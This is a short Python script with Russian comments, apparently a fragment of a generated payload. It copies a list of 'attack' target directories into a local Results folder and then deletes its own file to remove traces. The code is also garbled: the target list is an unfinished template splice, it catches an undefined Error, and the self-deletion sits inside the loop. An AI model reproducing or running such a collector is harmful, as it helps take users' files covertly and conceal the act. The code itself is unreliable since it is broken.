import os
import sys
from os import getcwd, mkdir
from os.path import basename
from shutil import copytree

directory = getcwd() + "/Results/"  # создаём новую директорию
try:
    mkdir(directory)
except FileExistsError:  # если директория создана, ...
    pass  # ... то не создаём :)

targetList = ''' + str(targetList) + '''

for target in targetList:
    under = directory + basename(target)  # адрес директории атаки
    try:
        copytree(target, under)  # пробуем скопировать директорию
    except Error:
        pass
    os.remove(str(sys.argv[0]))  # удаляем файл программы
